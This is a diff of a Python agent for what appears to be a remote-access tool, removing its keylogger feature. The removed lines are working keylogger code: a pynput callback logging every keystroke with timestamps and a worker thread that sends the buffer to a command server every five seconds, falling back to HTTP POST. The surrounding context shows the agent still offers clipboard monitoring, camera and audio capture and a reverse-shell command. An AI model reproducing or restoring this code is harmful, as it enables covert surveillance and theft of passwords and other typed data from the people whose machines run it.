@@ -703,7 +703,6 @@ TARGET_CAMERA_FPS = 20
 _stream_lock = threading.Lock()
 _audio_stream_lock = threading.Lock()
 _camera_stream_lock = threading.Lock()
-_keylogger_lock = threading.Lock()
 _clipboard_lock = threading.Lock()
 _reverse_shell_lock = threading.Lock()
 _voice_control_lock = threading.Lock()
@@ -743,9 +742,7 @@ CLIPBOARD_MONITOR_THREAD = None
 CLIPBOARD_BUFFER = []
 LAST_CLIPBOARD_CONTENT = ""
 
-KEYLOGGER_ENABLED = False
-KEYLOGGER_THREAD = None
-KEYLOG_BUFFER = []
+# Keylogger variables removed - feature disabled
 
 VOICE_CONTROL_ENABLED = False
 VOICE_CONTROL_THREAD = None
@@ -5994,9 +5991,7 @@ VOICE_CONTROL_THREAD = None
 VOICE_RECOGNIZER = None
 
 # --- Monitoring State ---
-KEYLOGGER_ENABLED = False
-KEYLOGGER_THREAD = None
-KEYLOG_BUFFER = []
+# Keylogger variables removed - feature disabled
 CLIPBOARD_MONITOR_ENABLED = False
 CLIPBOARD_MONITOR_THREAD = None
 CLIPBOARD_BUFFER = []
@@ -8742,124 +8737,9 @@ def handle_key_up(data):
     except Exception as e:
         log_message(f"Error handling key up: {e}")
 
-# --- Keylogger Functions ---
-
-def on_key_press(key):
-    """Callback for key press events."""
-    global KEYLOG_BUFFER
-    try:
-        if hasattr(key, 'char') and key.char is not None:
-            # Regular character
-            KEYLOG_BUFFER.append(f"{time.strftime('%Y-%m-%d %H:%M:%S')}: '{key.char}'")
-        else:
-            # Special key
-            KEYLOG_BUFFER.append(f"{time.strftime('%Y-%m-%d %H:%M:%S')}: [{key}]")
-    except Exception as e:
-        KEYLOG_BUFFER.append(f"{time.strftime('%Y-%m-%d %H:%M:%S')}: [ERROR: {e}]")
-
-def keylogger_worker(agent_id):
-    """Keylogger worker thread that sends data periodically."""
-    global KEYLOGGER_ENABLED, KEYLOG_BUFFER
-    
-    try:
-        while KEYLOGGER_ENABLED:
-            try:
-                if KEYLOG_BUFFER:
-                    # Send accumulated keylog data
-                    data_to_send = KEYLOG_BUFFER.copy()
-                    KEYLOG_BUFFER = []
-                    
-                    # Use socket.io for better performance and consistency
-                    try:
-                        if sio and sio.connected:
-                            for entry in data_to_send:
-                                safe_emit('keylog_data', {
-                                    'agent_id': agent_id,
-                                    'data': entry
-                                })
-                        else:
-                            log_message("Socket.io not connected, buffering keylog data", "warning")
-                            # Re-add data to buffer if connection is down
-                            KEYLOG_BUFFER.extend(data_to_send)
-                    except Exception as e:
-                        error_msg = str(e)
-                        # Silence connection errors
-                        if "not a connected namespace" not in error_msg and "Connection is closed" not in error_msg:
-                            log_message(f"Keylogger socket.io error: {e}")
-                        # Fallback to HTTP if socket.io fails
-                        if REQUESTS_AVAILABLE:
-                            try:
-                                url = f"{SERVER_URL}/keylog_data/{agent_id}"
-                                for entry in data_to_send:
-                                    requests.post(url, json={"data": entry}, timeout=5)
-                            except Exception as http_e:
-                                log_message(f"Keylogger HTTP fallback error: {http_e}")
-                                # Re-add data to buffer for next attempt
-                                KEYLOG_BUFFER.extend(data_to_send)
-                        else:
-                            log_message("HTTP fallback not available, re-buffering keylog data", "warning")
-                            KEYLOG_BUFFER.extend(data_to_send)
-                
-                time.sleep(5)  # Send data every 5 seconds
-            except KeyboardInterrupt:
-                log_message("Keylogger worker interrupted")
-                break
-            except Exception as e:
-                log_message(f"Keylogger worker error: {e}")
-                time.sleep(5)
-    except KeyboardInterrupt:
-        log_message("Keylogger worker interrupted")
-    
-    log_message("Keylogger worker stopped")
-
-def start_keylogger(agent_id):
-    """Start the keylogger."""
-    global KEYLOGGER_ENABLED, KEYLOGGER_THREAD
-    
-    if not PYNPUT_AVAILABLE:
-        log_message("Error: pynput not available for keylogger", "error")
-        return False
-    
-    with _keylogger_lock:  # ✅ THREAD-SAFE: Prevent race condition
-        if KEYLOGGER_ENABLED:
-            log_message("Keylogger already running", "warning")
-            return True
-        
-        try:
-            KEYLOGGER_ENABLED = True
-            
-            # Start keyboard listener
-            listener = keyboard.Listener(on_press=on_key_press)
-            listener.daemon = True
-            listener.start()
-            log_message("Keyboard listener started successfully")
-            
-            # Start worker thread
-            KEYLOGGER_THREAD = threading.Thread(target=keylogger_worker, args=(agent_id,))
-            KEYLOGGER_THREAD.daemon = True
-            KEYLOGGER_THREAD.start()
-            log_message("Keylogger worker thread started successfully")
-            
-            log_message("Keylogger started successfully")
-            return True
-            
-        except Exception as e:
-            log_message(f"Failed to start keylogger: {e}", "error")
-            KEYLOGGER_ENABLED = False
-            return False
-
-def stop_keylogger():
-    """Stop the keylogger."""
-    global KEYLOGGER_ENABLED, KEYLOGGER_THREAD
-    
-    with _keylogger_lock:  # ✅ THREAD-SAFE
-        if not KEYLOGGER_ENABLED:
-            return
-        
-        KEYLOGGER_ENABLED = False
-        # Don't join - daemon thread will exit naturally (prevents blocking)
-        KEYLOGGER_THREAD = None
-        log_message("Stopped keylogger.")
+# --- Keylogger Functions REMOVED ---
+# Keylogger functionality has been removed for privacy/security compliance
+# Remote control (mouse/keyboard) functionality is still available
 
 # --- Clipboard Monitor Functions ---
 
@@ -9743,8 +9623,7 @@ def main_loop(agent_id):
         "stop-audio": stop_audio_streaming,
         "start-camera": lambda: start_camera_streaming(agent_id),
         "stop-camera": stop_camera_streaming,
-        "start-keylogger": lambda: start_keylogger(agent_id),
-        "stop-keylogger": stop_keylogger,
+        # Keylogger commands removed - feature disabled
         "start-clipboard": lambda: start_clipboard_monitor(agent_id),
         "stop-clipboard": stop_clipboard_monitor,
         "start-reverse-shell": lambda: start_reverse_shell(agent_id),
@@ -12286,7 +12165,7 @@ def connect():
             'screen': True,
             'camera': CV2_AVAILABLE,
             'audio': PYAUDIO_AVAILABLE,
-            'keylogger': PYNPUT_AVAILABLE,
+            'keylogger': False,  # Disabled - feature removed
             'clipboard': True,
             'file_manager': True,
             'process_manager': PSUTIL_AVAILABLE,
@@ -14017,7 +13896,7 @@ def agent_main():
             'screen': True,
             'camera': CV2_AVAILABLE,
             'audio': PYAUDIO_AVAILABLE,
-            'keylogger': PYNPUT_AVAILABLE,
+            'keylogger': False,  # Disabled - feature removed
             'clipboard': True,
             'file_manager': True,
             'process_manager': PSUTIL_AVAILABLE,
@@ -14147,10 +14026,7 @@ def signal_handler(signum, frame):
         except Exception as e:
             log_message(f"Error stopping camera streaming: {e}")
         
-        try:
-            stop_keylogger()
-        except Exception as e:
-            log_message(f"Error stopping keylogger: {e}")
+        # Keylogger cleanup removed - feature disabled
         
         try:
             stop_clipboard_monitor()
